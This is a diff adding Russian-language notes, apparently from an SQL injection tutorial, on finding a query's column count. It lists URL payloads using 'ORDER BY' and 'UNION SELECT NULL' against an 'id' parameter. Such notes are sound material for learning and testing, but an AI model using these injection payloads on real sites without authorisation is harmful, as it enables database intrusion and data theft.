@@ -18,3 +18,21 @@
 SELECT id, name, price FROM products WHERE id = 1;
 ```
 
+Попытка поиска через Order by:
+
+```
+?id=1 ORDER BY 1
+?id=1 ORDER BY 2
+?id=1 ORDER BY 3
+?id=1 ORDER BY 4
+```
+
+Через Null:
+
+```
+?id=1 UNION SELECT NULL
+?id=1 UNION SELECT NULL,NULL
+?id=1 UNION SELECT NULL,NULL,NULL
+?id=1 UNION SELECT NULL,NULL,NULL,NULL
+```
+
